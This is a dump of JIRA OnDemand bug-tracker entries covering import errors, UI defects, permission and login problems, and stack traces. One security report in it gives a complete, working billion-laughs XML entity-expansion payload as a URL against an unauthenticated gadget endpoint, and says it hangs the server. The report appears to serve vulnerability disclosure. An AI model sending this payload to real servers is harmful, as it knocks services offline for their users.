fields.description:
h4. Summary

Importing a backup file in JIRA OnDemand from JIRA Behind-the-Firewall where Delegated Directory authentication (e.g. LDAP) is used causes duplicated key value errors.


h4. Steps to reproduce

# Generate a backup file from JIRA Behind-the-Firewall where Delegated auth is used
# Attempt to restore this file into JIRA OnDemand

h4. Expectation

Backup file is restored properly. 

h4. What actually happens:

Restore process fails on the background but no errors are given on the UI. When users try to log into JIRA OnDemand they get stuck on the dashboard with the Login option showing up on the top right corner.

On the logs support sees the following error:
{noformat}
@400000005273be491080c11c Caused by: org.ofbiz.core.entity.GenericEntityException: while inserting: [GenericEntity:Group][id,10011][groupName,example-group][updatedD
ate,2013-11-01 20:14:15.273][description,null][directoryId,10000][lowerDescription,null][active,1][local,0][type,GROUP][lowerGroupName,sm-viralproject][createdDate,201
3-11-01 20:14:15.273] (SQL Exception while executing the following:INSERT INTO public.cwd_group (ID, group_name, lower_group_name, active, local, created_date, updated
_date, description, lower_description, group_type, directory_id) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?) (ERROR: duplicate key value violates unique constraint "pk_cwd_group")
{noformat}

h4.  Workaround

Restore the file into a temporary Behind-the-Firewall installation, delete the Delegated Directory, export a backup file and then import that file into OnDemand.
fields.summary: Importing backup files from JIRA BTF with Delegated Auth into JIRA OnDemand doesn't work

fields.description:
When managing users if an admin clicks on 'groups' under 'operations' a lightbox pops up to make changes and can only be closed by making changes or pressing the esc key. There isn't a visual cancel or 'x' to close it out on screen.

Workaround: press the Esc key.
fields.summary: No visual way to close group membership popup

fields.description:
When searching for issues in OnDemand, all the components are visible if user does not filter/choose a specific project. This behavior happens only in OnDemand platform.

This is a crucial concern as users could view not intended information.
fields.summary: Access rights to projects are not checked on field "Components"

fields.description:
I noticed that issue navigator doesn't apply filter in following scenario:

1. Open issue directly from link/reload page while viewing issue (don't just browse from other issue/issue navigation as in this case filtering would work fine). For example open https://ecosystem.atlassian.net/browse/JRJC-88
2. From top menu select Issues->Reported by me (this is filter with id=-2)
3. There is no filter applied to the issue navigator view. If you reload page now, the filter will apply.

It looks that this happens only for built-in filter (id < 0) - for custom filters everything works fine. This could be related to url redirection - just guessing.

I've been able to reproduce this on EAN and JDOG.
fields.summary: Issue Navigation doesn't apply filter in some conditions

fields.description:
Steps to reproduce:

- Perform a search on a given project and save that as a filter in JIRA
- Go to Issues -> Manage Filters
- Click on the filter's name
- On the issue navigator, open any of the issues retrieved by the filter
- The issue URL will be displayed as https://testatlassian.atlassian.net/browse/TST-3?filter=10201
- If you copy this link and send it to a user that doesn't have permission to view this filter, when the user tries to edit the issue by clickin the "Edit" button on the issue, nothing will happen. 

Expected behavior: edit button should work.
fields.summary: Issue's edit button non-responsive when filter parameter is added to the end
XSS in /secure/admin/AssociateProjectRepPath!default.jspa

fields.description:
The Column Order defined for the filter will reset to the default Column Order after navigating to page 2 of the search result.

*Steps To Replicate*
# Create a new filter
# Modify the column order, by Clicking on Tools and Set Filter Column Order
# Randomly move the column order or add column
# Navigate to Page 2 of the search result, noticed Column order is reset to the order before changes were made on procedure 2
# Navigate to Page 1 of the search result, the Column order is reset as well

*Additional Information*
* Tested consistent on all supported browser
* Included a screen capture below to better show the error
fields.summary: Column Order Reset After Page Navigation on Issue Navigator

fields.description:
h3. Steps to reproduce
# Remove a user from all groups.
# Confirm that they don't show up for mentions in comments, etc.
# Go into a project's Roles page, try to add them as an individual user for a particular role.

The user shows up as an option in the autocomplete for that role. If a user isn't in any groups, they shouldn't be an option here.
fields.summary: Users that are not members of any groups appear in project role autocomplete fields

fields.description:
On my OnDemand instance I have 'Logout confirmation' set to 'Never', which I interpret to mean that I should never have to confirm when I try to logout.

This configuration option doesn't appear to be honoured.
fields.summary: Logout confirmation option not honoured on OnDemand

fields.description:
When a user changes the default language pack to English (UK) in general configuration, system date fields' name are not displayed properly. See screenshot below ( _Created, Due Date, Resolution Date_ and _Updated_ fields):
!issue_navigator_uk_english.png!

This also happens if a specific user changes the language pack in their user preferences, which makes the field names display erroneously only to them.

h4.Steps to reproduce
# In JIRA's general configuration screen, change default language pack to _English (UK)
# Look at the date field names displayed in the issue navigator, by clicking on _more_
fields.summary: JIRA fails to display sytem date fields' name when changing the default language package to English (UK)

fields.description:
Since the last OnDemand upgrade the CSS for most of the drop-down boxes are broken on the "Create Issue" screen. Please see image below:

!create_issue.png!

This appears to be happening only with the latest version of Google Chrome. It seems to be working fine when using Mozilla Firefox and Safari.
fields.summary: CSS of dropdown buttons is larger than select box

fields.description:
When adding or removing remote links to an issue, the Updated field displayed on the issue details page under the Dates section gets updated to the current date and time (see attached "Dates - updated.png").

However, when searching for issues that have been updated in a given interval, those who only had remote links added or removed are not being displayed. Other operations, like adding comments, will make issues appear in search.
fields.summary: Issue search by Updated date does not work related to remote link actions
Avatars on issue appear distorted
Mail Handlers are triggered 1 minute beyond the configured refresh rate

fields.description:
After the latest upgrade to JIRA 6.2-OD-7, it's no longer possible to approve or reject planned times in Tempo.

h5.Steps to reproduce:

# Go to Tempo and try to approve a time planned for a user.
# When the pop up message appears it shows broken buttons:

!_i18n_getText___actionButton__-_-_Intelicom_Sp__z_o_o___JIRA_.png|thumbnail!

Also, clicking the buttons produces a a java exception on the screen:

{code}
Cause
Referer URL: https://<instance>.atlassian.net/secure/TempoUserBoard!timesheet.jspa
java.lang.NullPointerException
java.lang.NullPointerException
at com.tempoplugin.project.service.ProjectServiceImpl.getActivity(ProjectServiceImpl.java:255)
at com.tempoplugin.view.action.TempoDeleteAllocation.getActionForm(TempoDeleteAllocation.java:31)
at com.tempoplugin.view.TempoDayAction.doDefault(TempoDayAction.java:188)
at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)
at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)
at java.lang.reflect.Method.invoke(Method.java:597)
at webwork.util.InjectionUtils$DefaultInjectionImpl.invoke(InjectionUtils.java:70)
at webwork.util.InjectionUtils.invoke(InjectionUtils.java:56)
at webwork.action.ActionSupport.invokeCommand(ActionSupport.java:438)
at webwork.action.ActionSupport.execute(ActionSupport.java:157)
at com.atlassian.jira.action.JiraActionSupport.execute(JiraActionSupport.java:87)
at webwork.interceptor.DefaultInterceptorChain.proceed(DefaultInterceptorChain.java:39)
at webwork.interceptor.NestedInterceptorChain.proceed(NestedInterceptorChain.java:31)
at webwork.interceptor.ChainedInterceptor.intercept(ChainedInterceptor.java:16)
at webwork.interceptor.DefaultInterceptorChain.proceed(DefaultInterceptorChain.java:35)
at webwork.dispatcher.GenericDispatcher.executeAction(GenericDispatcher.java:225)
at webwork.dispatcher.GenericDispatcher.executeAction(GenericDispatcher.java:154)
{code}

h5.Workaround

You can approve and reopen user timesheets in the User Timesheet view
in Team Timesheet select View Timesheet and Approve or Reject the timesheet for the selected user.
(i) we have contacted Tempo Support team to investigate the issue as well, you can follow the updates in [this ticket|https://tempoplugin.jira.com/browse/TT-317]

fields.description:
An attacker is able to perform the billion laughs attack on a default JIRA installation (including OnDemand installations). This attack can be executed without authentication and leads to the complete use of resources on the victim machine (causing the server to crash or hang). It is possible due to the ability of being able to inject malicious XML entities through {{/plugins/servlet/gadgets/ifr?rawxml=}}.

Steps to recreate:

1. Replace the values in the following URL (host) and (host/jirapath):
{noformat}
https://host/plugins/servlet/gadgets/ifr?rawxml=%3C%3Fxml+version%3D%
221.0%22+encoding%3D%22UTF-8%22%3F%3E%3C%21DOCTYPE+lolz+%5B%0D%0A+%3C%21ENTITY+lol+%22lol%22%3E%0D%0A+%3C%21ELEMENT+lolz+%28%23PCDATA%29%3E%0D%0A+%3C%21ENTITY+lol1+%22%26lol%3B%26lol%3B%26lol%3B%26lol%3B%26lol%3B%26lol%3B%26lol%3B%26lol%3B%26lol%3B%26lol%3B%22%3E%0D%0A+%3C%21ENTITY+lol2+%22%26lol1%3B%26lol1%3B%26lol1%3B%26lol1%3B%26lol1%3B%26lol1%3B%26lol1%3B%26lol1%3B%26lol1%3B%26lol1%3B%22%3E%0D%0A+%3C%21ENTITY+lol3+%22%26lol2%3B%26lol2%3B%26lol2%3B%26lol2%3B%26lol2%3B%26lol2%3B%26lol2%3B%26lol2%3B%26lol2%3B%26lol2%3B%22%3E%0D%0A+%3C%21ENTITY+lol4+%22%26lol3%3B%26lol3%3B%26lol3%3B%26lol3%3B%26lol3%3B%26lol3%3B%26lol3%3B%26lol3%3B%26lol3%3B%26lol3%3B%22%3E%0D%0A+%3C%21ENTITY+lol5+%22%26lol4%3B%26lol4%3B%26lol4%3B%26lol4%3B%26lol4%3B%26lol4%3B%26lol4%3B%26lol4%3B%26lol4%3B%26lol4%3B%22%3E%0D%0A+%3C%21ENTITY+lol6+%22%26lol5%3B%26lol5%3B%26lol5%3B%26lol5%3B%26lol5%3B%26lol5%3B%26lol5%3B%26lol5%3B%26lol5%3B%26lol5%3B%22%3E%0D%0A+%3C%21ENTITY+lol7+%22%26lol6%3B%26lol6%3B%26lol6%3B%26lol6%3B%26lol6%3B%26lol6%3B%26lol6%3B%26lol6%3B%26lol6%3B%26lol6%3B%22%3E%0D%0A+%3C%21ENTITY+lol8+%22%26lol7%3B%26lol7%3B%26lol7%3B%26lol7%3B%26lol7%3B%26lol7%3B%26lol7%3B%26lol7%3B%26lol7%3B%26lol7%3B%22%3E%0D%0A+%3C%21ENTITY+lol9+%22%26lol8%3B%26lol8%3B%26lol8%3B%26lol8%3B%26lol8%3B%26lol8%3B%26lol8%3B%26lol8%3B%26lol8%3B%26lol8%3B%22%3E%0D%0A%5D%3E%0D%0A%3CModule%3E%0D%0A%3CModulePrefs+title%3D%22Example%22%3E%0D%0A%3C%2FModulePrefs%3E%0D%0A%3CContent%3E%0D%0Adfgd%26lol9%3B%0D%0A%3C%2FContent%3E%0D%0A%3C%2FModule%3E%0D%0A++++&url=https%3A%2F%2Fhost/jirapath%2Frest%2Fgadgets%2F1.0%2Fg%2Fcom.atlassian.jira.gadgets%3Aintroduction-gadget%2Fgadgets%2Fintroduction-gadget.xml
{noformat}
2. Make a request to the above URL, and the DoS exploit will be executed.

For example, on a test OnDemand instance, the URL to DoS the instance would be:

{noformat}
https://0daytest.jira-dev.com/plugins/servlet/gadgets/ifr?rawxml=%3C%3Fxml+version%3D%221.0%22+encoding%3D%22UTF-8%22%3F%3E%3C%21DOCTYPE+lolz+%5B%0D%0A+%3C%21ENTITY+lol+%22lol%22%3E%0D%0A+%3C%21ELEMENT+lolz+%28%23PCDATA%29%3E%0D%0A+%3C%21ENTITY+lol1+%22%26lol%3B%26lol%3B%26lol%3B%26lol%3B%26lol%3B%26lol%3B%26lol%3B%26lol%3B%26lol%3B%26lol%3B%22%3E%0D%0A+%3C%21ENTITY+lol2+%22%26lol1%3B%26lol1%3B%26lol1%3B%26lol1%3B%26lol1%3B%26lol1%3B%26lol1%3B%26lol1%3B%26lol1%3B%26lol1%3B%22%3E%0D%0A+%3C%21ENTITY+lol3+%22%26lol2%3B%26lol2%3B%26lol2%3B%26lol2%3B%26lol2%3B%26lol2%3B%26lol2%3B%26lol2%3B%26lol2%3B%26lol2%3B%22%3E%0D%0A+%3C%21ENTITY+lol4+%22%26lol3%3B%26lol3%3B%26lol3%3B%26lol3%3B%26lol3%3B%26lol3%3B%26lol3%3B%26lol3%3B%26lol3%3B%26lol3%3B%22%3E%0D%0A+%3C%21ENTITY+lol5+%22%26lol4%3B%26lol4%3B%26lol4%3B%26lol4%3B%26lol4%3B%26lol4%3B%26lol4%3B%26lol4%3B%26lol4%3B%26lol4%3B%22%3E%0D%0A+%3C%21ENTITY+lol6+%22%26lol5%3B%26lol5%3B%26lol5%3B%26lol5%3B%26lol5%3B%26lol5%3B%26lol5%3B%26lol5%3B%26lol5%3B%26lol5%3B%22%3E%0D%0A+%3C%21ENTITY+lol7+%22%26lol6%3B%26lol6%3B%26lol6%3B%26lol6%3B%26lol6%3B%26lol6%3B%26lol6%3B%26lol6%3B%26lol6%3B%26lol6%3B%22%3E%0D%0A+%3C%21ENTITY+lol8+%22%26lol7%3B%26lol7%3B%26lol7%3B%26lol7%3B%26lol7%3B%26lol7%3B%26lol7%3B%26lol7%3B%26lol7%3B%26lol7%3B%22%3E%0D%0A+%3C%21ENTITY+lol9+%22%26lol8%3B%26lol8%3B%26lol8%3B%26lol8%3B%26lol8%3B%26lol8%3B%26lol8%3B%26lol8%3B%26lol8%3B%26lol8%3B%22%3E%0D%0A%5D%3E%0D%0A%3CModule%3E%0D%0A%3CModulePrefs+title%3D%22Example%22%3E%0D%0A%3C%2FModulePrefs%3E%0D%0A%3CContent%3E%0D%0Adfgd%26lol9%3B%0D%0A%3C%2FContent%3E%0D%0A%3C%2FModule%3E%0D%0A++++&url=https%3A%2F%2F0daytest.jira-dev.com%2Frest%2Fgadgets%2F1.0%2Fg%2Fcom.atlassian.jira.gadgets%3Aintroduction-gadget%2Fgadgets%2Fintroduction-gadget.xml
{noformat}

Note the above URL is working, and the instance is currently up. You can see the exploit in action by visiting that link until the server hangs.

The original reporter of this security report was Nir Goldshlager {{ngoldshlager@salesforce.com}}.
fields.summary: Remote DoS Exploit on JIRA

fields.description:
Apparently, this seems to be caused by a critical patch to IE which was applied over the weekend - http://technet.microsoft.com/en-us/security/bulletin/ms13-028. In order to solve this problem, the current workaround is to proceed with the following:

Workaround 1: Reset the IE settings
# Click on Tools/Internet Options and go to the advanced tab (At the bottom of that window there will be a Reset button).
# Click this button to bring up the reset window. 
# Then click the reset button on the bottom of that window. 
# Close IE and open it again. JIRA should be working fine.

Workaround 2: 
Use other browsers or use different computers.

fields.description:
h5. Steps to reproduce:

- Add gadget subscription to JIRA, and make sure Confluence is added.
- Add an activity stream in JIRA dashboard and edit it to choose which streams to show.

You will notice that you only see JIRA in the streams options and not Confluence anymore. Logs have nothing indicating a problem

!gadget.png|thumbnail!

h5. Workaround:

You can add a link from a JIRA issue to a Confluence page. Or mention a JIRA issue in a Confluence test page, and the gadget will show Confluence afterwards. You can delete that link afterwards.

fields.summary: work logged no longer visible through time sheet gadgets

fields.description:
h4. Steps to reproduce
# Go to the User Browser.
# Click "Groups" next to a project
# Select one of the groups, then hit Cmd-A to select all of them.

h4. Expected behaviour
All of the groups are selected so the user can be added to them all in one hit.

h4. Actual behaviour
The groups _are_ selected but then the whole page refreshes and the user still isn't in any of the selected groups.

This only happens in Safari (6.0.3).
fields.summary: Pressing Command-A in new Edit Groups dialog in Safari triggers page refresh

fields.description:
Using the new ondemand-core-1.6.3 version due to changes on the order which the *AppStatusChangeEvent* and *ApplicationEnabledEvent* are propagated by the *AppStatusService*, there is an error condition that started to happen when the customer adds FishEye/SVN to OnDemand.

The problem is that the SVN repository creation fails due to the 'authz' file not being present at the right time the calls are made from JIRA, so the project extension feature fails leaving the new repository in FishEye/SVN in a bad state.

The problem only affects customers that already have JIRA and at least one project and then buy FishEye/SVN on a second step after the initial provisioning.
fields.summary: Project extension to FishEye/SVN fails with a RuntimeException when the file svn/root/conf/authz cannot be found and is not retried later

fields.description:
h5.summary
After logging in without the JIRA Users permission or no Application Access, a login redirect loop occurs.

h5.steps to reproduce
# set a user account to either have no JIRA Users permission, or no Application Access;
# go to an OnDemand instance and log in with these credentials.

*Expected result:* a warning about missing permissions is displayed. 

*Actual result:* System Dashboard is displayed, with the _Log In_ button in top right corner. Clicking it only refreshes the page, it's impossible to log out and only after clearing the browser cache the login page can be accessed again.
  
See the attached video to see this behaviour in a publicly accessible agile board.
fields.summary: Login loop in JIRA OnDemand if user does not have JIRA User permission

fields.description: As shown in the screenshot, when arriving in the mail server setting page, there is not radio button to select to configure the server now, but once I chose the radio button for later, it shows up the configuration page. Then it is impossible to skip the settings.
fields.summary: Impossible to skip the mail server setting during the setup procedure

fields.description:
When using Chrome 35, if we try to create an issue on the issue navigator screen with the 'Details View' set, the create issue window appears in blank.

It only happens on MacBook Pro Retina with 2560px.

*Workarounds*
1 - resize browser window
2 - change to 'List View'
3 - use another browser
fields.summary: Create Issue window is blank when seeing details view on Chrome
Clicking the 'Read more' link in the activity stream is broken

fields.description:
Creating a new dashboard and add the JIRA News Gadget will cause the contents not to be loaded.

And further check on Chrome's Developer tool, spotted the following message:

{noformat}
[blocked] The page at 'https://rgee.jira-dev.com/plugins/servlet/gadgets/ifr?container=atlassian&m…Fwww.atlassian.com%2Fgadgets%2Fnews.xml&libs=auth-refresh#rpctoken=7907785' was loaded over HTTPS, but ran insecure content from 'http://www.atlassian.com/gadgets/jira-news.jsp?news=true&events=true&ads=true': this content should also be loaded over HTTPS.
 ifr?container=atlassian&mid=10104&country=US&lang=en&view=default&view-params=%7B%22writable%22%3A%…:50
{noformat}

Tested this is affecting our SAC instance as well. Affected browsers tested so far is Chrome and Firefox. Safari seems to be able to render to content correctly.
fields.summary: JIRA News Gadget Not Rendering Due to the Source from HTTP on Chrome and Firefox

fields.description:
If a customer has an export from a JIRA that has a recent version of GreenHopper (where GH's licence is stored in the UPM) and imports this into OnDemand, the GH licence will be imported along with the JIRA data.

This licence will take priority over OnDemand's GH licence and GH will not work until a support engineer manually removes the licence from the database and restarts JIRA, which is quite disruptive to the customer.

I believe the importer already strips out the older-style GH licence, so it needs to be updated to handle the new UPM-style licence too.
fields.summary: OnDemand JIRA importer: Strip GreenHopper's UPM licence
Ofbiz and business layer piercing: manipulating directly the ofbiz GenericValue on time-tracking.
JIRA OnDemand 5.0.6 upgrade breaks existing custom mail servers

fields.description:
Existing users that log in with Gapps are not seeing Name info updated in JIRA/Crowd.

*Steps to Reproduce*
After a user has logged into the instance for the first time from Google, change the name in GApps

*Expected Results*
Name will be updated in JIRA after Google sync

*Actual Results*
Name is NOT updated in JIRA and requires the change to be made via Crowd

*Workaround*
When you change a username in Google Apps, this change isn't reflected until the user is completely logged out.  Google is still sending the incorrect username if the change is made while the user is logged in. So to fix this, simply ask the affected user to log out of Google and OnDemand.
fields.summary: Google Apps First/Last Name not syncing with existing users

fields.description:
h3. Problem

When using \{\{{{…}}}} to format text as monospaced (which is commonly used for inline code snippets), text that reassembles smileys gets substituted for the simley image:

{{;) :) :(}}
h3. Work around

Use the \{noformat} macro instead.
fields.summary: Jira adds smileys in monospaced text

fields.description:
In the ConfigureFieldScreen when editing a screen, the grey handlers to move the fields do not appear when using IE9, IE10, IE11.

Issues -> Screens -> Configure

(turning off IE "compatibility view settings" did not help)
fields.summary: The grey handlers in the Jira ConfigureFieldScreen do not appear in IE9, IE10, IE11

fields.description:
Fireball-205 previously provided a 'User Picker' icon from the 'Edit Members' screen.  This allowed the quick bulk addition of many users to a group.  Per the attached example.

From fireball-206 onwards this was not available.  This affects the bulk addition of users as the names must be typed individually.

*Workaround* 
-The functionality is still available and can be accessed from the following link:-
-https://<instance>/secure/popups/UserPickerBrowser.jspa?formName=jiraform&multiSelect=true&element=usersToAssignStr-
fields.summary: User Picker icon not available from Groups > Edit Members

fields.description:
This is a bug found while triaging: https://support.atlassian.com/browse/JST-60176

Since the latest upgrade of the JIRA OnDemand instance the AttachmentManager has been broken while attaching files to comments. 

h4. Stack Trace
{code}
2013-03-26 15:49:42,902 ERROR [SupportEmails] QuartzScheduler_Worker-2 ServiceRunner    Support Emails Exception while creating attachment for issue SPT-5008: java.lang.NullPointerException
java.lang.NullPointerException
        at com.atlassian.jira.issue.managers.DefaultAttachmentManager.createAttachmentBean(DefaultAttachmentManager.java:409)
        at com.atlassian.jira.issue.managers.DefaultAttachmentManager.createAttachment(DefaultAttachmentManager.java:378)
        at com.atlassian.jira.issue.managers.DefaultAttachmentManager.createAttachment(DefaultAttachmentManager.java:371)
        at com.atlassian.jira.issue.managers.DefaultAttachmentManager.createAttachment(DefaultAttachmentManager.java:462)
        at com.atlassian.jira.service.util.handler.DefaultMessageHandlerContext.createAttachment(DefaultMessageHandlerContext.java:83)
        at com.atlassian.jira.service.services.mail.DelegatingMessageHandlerContext.createAttachment(DelegatingMessageHandlerContext.java:53)
        at com.atlassian.jira.plugins.mail.handlers.AbstractMessageHandler.createAttachmentWithPart(AbstractMessageHandler.java:978)
        at com.atlassian.jira.plugins.mail.handlers.AbstractMessageHandler$1.handlePart(AbstractMessageHandler.java:572)
        at com.atlassian.jira.plugins.mail.handlers.AbstractMessageHandler.handleMultipart(AbstractMessageHandler.java:661)
        at com.atlassian.jira.plugins.mail.handlers.AbstractMessageHandler.createAttachmentsForMessage(AbstractMessageHandler.java:622)
        at com.atlassian.jira.plugins.mail.handlers.AbstractCommentHandler.handleMessage(AbstractCommentHandler.java:138)
        at com.atlassian.jira.plugins.mail.handlers.CreateOrCommentHandler.handleMessage(CreateOrCommentHandler.java:112)
        at com.atlassian.jira.service.services.mail.MailFetcherService$1.process(MailFetcherService.java:368)
        at com.atlassian.jira.service.services.mail.MailFetcherService$MessageProviderImpl.getAndProcessMail(MailFetcherService.java:271)
        at com.atlassian.jira.service.services.mail.MailFetcherService.runImpl(MailFetcherService.java:356)
        at com.atlassian.jira.service.services.file.AbstractMessageHandlingService.run(AbstractMessageHandlingService.java:257)
        at com.atlassian.jira.service.JiraServiceContainerImpl.run(JiraServiceContainerImpl.java:61)
        at com.atlassian.jira.service.ServiceRunner.execute(ServiceRunner.java:48)
        at org.quartz.core.JobRunShell.run(JobRunShell.java:195)
        at org.quartz.simpl.SimpleThreadPool$WorkerThread.run(SimpleThreadPool.java:520)
{code}

h4. Possible Culprit Commit
cc920660309f76fbf94a1be86f03c779e1fd740c

h4. Cause of exception
In file DefaultAttachmentManager.java on line 408/409 an attachment is create using the createAttachment function found on line 412. This function can return null, e.g. if the file or filename is null, therefore on line 409 when they try to call getId on the variable 'attachment' a null pointer exception is thrown as attachment is null.

h4. Advice
CreateAttachment functions need to be cleaned up, I could not understand what was going on as there are 10 createAttachment functions and so could not figure out a workaround, therefore pushing this quickly would be appreciative for the customer.
fields.summary: Null pointer exception when attaching files from emails to comments

fields.description:
After renaming a status in the Status screen, the new name is not reflected in the Classic Mode workflow. However, the change is displayed correctly in text mode, or in the new workflow designer.

h4. Steps to reproduce:
# Edit the name of one of the statuses (under https://<subdomain>.atlassian.net/secure/admin/ViewStatuses.jspa)
# Go to one of the workflows that use this status. Check text mode, the updated status name should be displaying correctly
# Now, go to Diagram mode. Again, the updated status name should be displaying correctly
# Click "Enter classic mode". The status name displayed is not the the updated one, it is the old one.
fields.summary: When renaming a status, the new name is not reflected in the Classic Mode workflow

fields.description:
*Steps to replicate:*

# Create an issue
# Create a sub-task with a summary of 254 characters
# Create another sub-task with a short summary
# Clone parent issue and tick the 'Clone sub-tasks' box.

*Result:*

Sub-tasks are not cloned as the first sub-task will end up with a summary of over 255 characters

*Expected Result:*

A warning is thrown to say the summary is too long, or the summary is truncated, but ultimately that sub-tasks are cloned

*Workaround:*

Shorten the summary of the parent issue

*Error thrown in logs:*

{noformat}
@400000005195aafe217fc47c 2013-05-17 03:58:44,561 TP-Processor16 WARN sysadmin 238x20591x1 djkvet 59.167.133.100,59.167.29.201 /secure/CloneIssueDetails.jspa [web.action.issue.CloneIssueDetails] Could not create subtask for issue: SOF-16, validation error has occured: Error creating issue: org.ofbiz.core.entity.GenericEntityException: while inserting: [TICKET DETAILS HERE] (ERROR: value too long for type character varying(255)))
{noformat}
fields.summary: Cloning an issue with a sub-task containing a summary of close to 255 characters causes sub-tasks to not be cloned

fields.description:
h3. ***Summary***
Users that are unlicensed, with no permissions, no groups associated and no application access are still suggested by JIRA.

h3. ***Expected Behavior*** 
- Users that have been unlicensed cannot be assigned to issues especially since user does not have assignable permission
- Users should not be suggested by JIRA


h3. ***Steps to reproduce***
# Create user with JIRA application access
# Remove user's application access
# Assign issue to user without application access
# Mention user without application access in comment
# Change reporter of issue to user without application access
# Add user without application access as watcher to an issue
fields.summary: Unlicensed users are not respected by JIRA

fields.summary: Unable to delete FishEye applink after creation on OnDemand

fields.description:
{color:#FF00FF}*Version*{color}
Whatever the version of OnDemand is

{color:#FF00FF}*Browser*{color}
Chrome (Latest OSX)

{color:#FF00FF}*To reproduce*{color}
# Ensure that you have at least one label and it should have at least one bug (Bug need not matter but it does help)
# Build a JQL search query (for example - https://ondemandinstance.jira.com/issues/?jql=labels+%3D+%22LABELNAME%22 )
# Press the share button and email to yourself

{color:#FF00FF}*Expectation*{color} (/) (y)
You are shared the filter without the label

{color:#FF00FF}*Actual Result*{color} (x) (n)
You should be shared the filter with the label
fields.summary: Sharing a filter which is a label does not share the label

fields.description: On some calendars (the ones for which don't use the built-in Priority field), the data point bars are empty. Please see the attached screenshot.
fields.summary: Data Point Bars are Empty in Some Calendars
Unable to commit to OnDemand Subversion repository with a valid issue key

fields.description: When the invite users button is present in the menu bar, clicking it will result in a popup. This popup isn't scrollable and the users have to tab through the boxes to remove it from the screen.
fields.summary: Invite users popup isn't scrollable

fields.description:
Steps to reproduce:
* Enter a comment
* Hit wiki preview
* Hit 'Cancel'. This should restore the comment form to blank (it does when you're not in wiki preview)
* Hit comment again. You should get an empty form, but...
* You get the wiki preview from previously.  Hitting Create doesn't work anymore now. You have to leave wiki preview first.
fields.summary: Cancelling comment form when in wiki preview mode doesn't clear the form

fields.description:
Import of data from JIRA 5.2.2 to OnDemand fails with the message "This archive doesn't contains any valid avatars" (sic).

The root cause is that the avatars zip file contains some files with .jim extension:

{noformat}
[~/jira/home/data/avatars]$ ll
total 24
drwxr-xr-x  5 shaldane  staff   170 11 Dec 18:19 .
drwxr-xr-x  4 shaldane  staff   136 11 Dec 18:19 ..
-rw-r--r--  1 shaldane  staff  1284 11 Dec 18:19 10200_attachment2871347870287331752.jim
-rw-r--r--  1 shaldane  staff   852 11 Dec 18:19 10200_medium_attachment2871347870287331752.jim
-rw-r--r--  1 shaldane  staff   341 11 Dec 18:19 10200_small_attachment2871347870287331752.jim
{noformat}

These files are created when selecting the demo project option when logging into the JIRA instance for the first time.

This happened exporting from JIRA 5.2.2 running locally, and importing into JIRA 6.0-OD-1.1 in OnDemand.
fields.summary: OnDemand import fails when export contains demo project data
Fisheye changesets and revision numbers are not being rendered JIRA comments when JIRA OnDemand is not linked with Fisheye Standalone.

fields.description:
*Steps to Reproduce*

* Add custom field of type 'Message Custom Field (view) or (edit)'
* Fill in all the required fields
at the search template select field it says "There are no search templates for this custom field type."
* When you press finish JIRA will give you the following error:

!error.png!

Technical details: We have tried with JIRA Toolkit plugin version 0.27 and 0.34.3 and it seems that after creating the custom field and associating global context to it, the field is not showing on any of the screens.
fields.summary: Creating a Message Custom Field gives the error "Invalid searcher chosen"

fields.description:
h5. Steps to reproduce:

Go full screen on your browser
Click on a blank avatar, upload a new image then you get a popup to crop that image. It's resized wrongly.

Attached screen shot.
fields.summary: JIRA User Avatar popup broken for a browser window over a certain size

fields.description:
As a Sales Manager, I should be able to see the sales forecast for the next quarter

Acceptance Criteria:-
1) I should be able to see the forecast for next quarter
2) I should be abler to edit
3) I should be able to assign
fields.summary: Sales forecast to be displayed

fields.description:
When viewing issues in Jira, and you zoom in, or increase the font of the text on the page (ctrl + mouse wheel), the Issue text will wrap down to a second line.  This seems to only occur in Windows using Chrome, and Linux - versions confirmed for bug are:

-Unable to reproduce in Mac OSX using Chrome.-

Will Attach creen shots for a better description.
fields.summary: Word wrap formatting issue when zooming in, or increasing font size on Jira Issue pages using Chrome for Windows, or Ubuntu.

fields.description:
If you put a "Field has been Modified" Validator in the Create transition within a Project's workflow and attach it to the Priority field, JIRA still allows someone to create a ticket without changing the Priority field from its default.

Using JIRA OnDemand.
fields.summary: "Field has been Modified" Validator does not work on Priority field

fields.description:
*Steps to reproduce*
# Create a trusted application link from JIRA to Confluence using Confluence 5.x and JIRA 6.x
# As of [this page|https://confluence.atlassian.com/display/DOC/Configuring+Workbox+Notifications] the application link should be displayed at *Confluence Admin > In-app Notifications*
# Notice that with JIRA 6 this does not happen, altought with the currently latest 5.2.11 it works as expected.
fields.summary: JIRA 6 linked to Confluence does not display application link at Confluence Admin > In-app notifications
Studio Importer - The XML document does not contain the <entity-engine-xml> root element or it was closed too early.

fields.description:
OnDemand customers can now import workflows from the Marketplace into their instance per:

https://confluence.atlassian.com/display/AOD/Sharing+Your+Workflow

However, we have instituted checks to verify that the package does not exceed 5MB (https://jdog.atlassian.net/browse/JRADEV-17202), and Recruitment Workflow (provided by Atlassian Labs) is 5.6MB, resulting in the error seen in the attached image.
fields.summary: Importing Recruitment Workflow from Marketplace results in File is too large to import

fields.description:
The 'Create Crucible Review' workflow post-function appears to be broken since the beginning of OnDemand.
When adding the post-function in the workflow transition this is displayed as follows:
!func.png!
fields.summary: 'Create Crucible Review' workflow function broken

fields.description:
When creating a new OD instance from Google Apps, the admin username is populated with the email address of the admin user, not the username.  When logging in for the first time through Google, a new user is created that does not have administrator access, and because the original user is the same email address you are unable to login.

h2. Example:

I am the administrator on my Google Apps domain, dave@mydomain.com, and I go to create a new OnDemand instance from the Atlassian OnDemand app.  This prefills the form with the admin user "dave@mydomain.com", and creates the OD instance with that as the username of the admin.  

I then go to my new OnDemand instance, let's say daveisawesome.atlassian.net, and login via Google.  Google sees that there are no users named "dave", so creates a new JIRA user with username "dave" and email "dave@mydomain.com", with only user-level access.  If I try to login via JIRA, not using Google, using the user "dave@mydomain.com", I get the message that I'm trying to login with an email when I should be using my username.

h2. Workaround
If you've already tried logging in via Google:
File a support ticket so that support can delete the original administrator login, and add the "dave" user to the administrators group.

If you *have not yet logged in via Google*:
Login to the OnDemand instance directly, not via Google, using your email address as the username "dave@mydomain.com".  Create a new user, username dave, email "dave@mydomain.com", with administrator rights.  When you login via Google, it will merge with that "dave" user and you can then remove or deactivate the original admin to free up the license seat.
fields.summary: Creating new OnDemand instances from Google Apps populates the admin username incorrectly

fields.description:
h2. What
